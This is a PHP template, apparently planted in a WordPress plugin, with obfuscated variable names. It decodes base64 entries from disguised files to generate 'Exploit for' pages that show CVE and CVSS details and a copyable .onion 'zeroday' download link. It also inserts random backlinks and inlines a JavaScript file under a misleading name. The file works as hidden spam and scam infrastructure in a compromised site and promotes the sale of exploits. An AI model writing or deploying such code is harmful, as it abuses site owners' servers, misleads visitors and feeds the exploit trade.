<?php

function icsphn($uBEgnnr5N) {
    $vQ23Gl = 0;
    $ffZAHskFX = strlen($uBEgnnr5N);
    for ($i = 0; $i < $ffZAHskFX; $i++) $vQ23Gl += ord($uBEgnnr5N[$i]);
    return $vQ23Gl;
}

$aXdMCGkM5s = intval(get_query_var('hzneofubg'));

if ($aXdMCGkM5s < 1 || $aXdMCGkM5s > 805) return;
$uk384Ja = file(plugin_dir_path(__FILE__).'page-specific.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$eGJOruW = explode(';', base64_decode($uk384Ja[$aXdMCGkM5s]));
if (count($eGJOruW) < 2) return;
$lulDAtaE = $eGJOruW[0];
$af7M0gS3Ho = icsphn($lulDAtaE);
//$jujydKXZ = $lulDAtaE . ' POC (Proof-of-Concept)';
$jujydKXZ = 'Exploit for ' . $lulDAtaE;
$wVYMH  = $eGJOruW[1];
$mCMtv = $eGJOruW[2];
$lAF8o = $eGJOruW[3];
$xh2lmXfa  = $eGJOruW[4];
set_query_var('wyfsemzei', $jujydKXZ);

$rpS0nJ = '';
$e1c2yhn = plugin_dir_path(__FILE__).'elements-auto.php';
if (is_file($e1c2yhn)) {
	$mh8EdsL2RI = file($e1c2yhn, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($mh8EdsL2RI);
	shuffle($mh8EdsL2RI);
	$nUVaJygJ = mt_rand(2, 5);
	if (count($mh8EdsL2RI) > $nUVaJygJ) {
		for ($a6Nwt = 0; $a6Nwt < $nUVaJygJ; $a6Nwt++) {
			$lyCJ0 = base64_decode(array_shift($mh8EdsL2RI));
			$rpS0nJ .= '<p><a href="'.$lyCJ0.'">'.$lyCJ0.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $jujydKXZ; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $xh2lmXfa . "</p>\n";
				if (strlen($wVYMH) > 0) echo "<p><strong>Published: </strong>" . $wVYMH . "</p>\n";
				if (strlen($mCMtv) > 0) echo "<p><strong>CVSS: </strong>" . $mCMtv . "</p>\n";
				if (strlen($lAF8o) > 0) echo "<p><strong>CVSS Vector: </strong>" . $lAF8o . "</p>\n";
				?>
				<p><strong>Download <?php echo $jujydKXZ; ?> here:</strong></p>
				
				<div class="url-container">
					<textarea class="url-textarea" readonly>http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($lulDAtaE)) . '.' . $af7M0gS3Ho; ?>/</textarea>
					<button class="copy-btn">Copy</button>
				</div>
				<p></p>
				<p>Use <a target="_blank" href="https://www.torproject.org/download/">Tor Browser</a> to access .onion site.</p>
				<p></p>


				<?php
				echo $rpS0nJ;
				?>


  <script>
    document.querySelectorAll('.url-container').forEach(container => {
      const textarea = container.querySelector('.url-textarea');
      const button = container.querySelector('.copy-btn');

      button.addEventListener('click', async () => {
        const textToCopy = textarea.value.trim();

        try {
          await navigator.clipboard.writeText(textToCopy);

          // Visual feedback
          const originalText = button.textContent;
          button.textContent = 'Copied!';
          button.classList.add('copied');

          // Reset button after 2 seconds
          setTimeout(() => {
            button.textContent = originalText;
            button.classList.remove('copied');
          }, 2000);

        } catch (err) {
          console.error('Failed to copy:', err);
          alert('Failed to copy to clipboard');
        }
      });
    });
  </script>

  <style>
    .url-container {
      position: relative;
      margin-bottom: 15px;
      max-width: 600px;
    }

    .url-textarea {
      width: 100%;
      height: 80px;
      padding: 12px 15px;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-family: monospace;
      font-size: 15px;
      resize: vertical;
      box-sizing: border-box;
    }

    .copy-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      padding: 8px 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      transition: background-color 0.2s;
    }

    .copy-btn:hover {
      background-color: #0056b3;
    }

    .copy-btn.copied {
      background-color: #28a745;
    }
  </style>


			</div>
		</article>
	</main>
</div>

<?php
$zaxssGp7 = plugin_dir_path(__FILE__) . 'changer-demomentsomtres.js';
if (is_file($zaxssGp7)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($zaxssGp7);
	echo '</script>';
}
get_footer();
?>
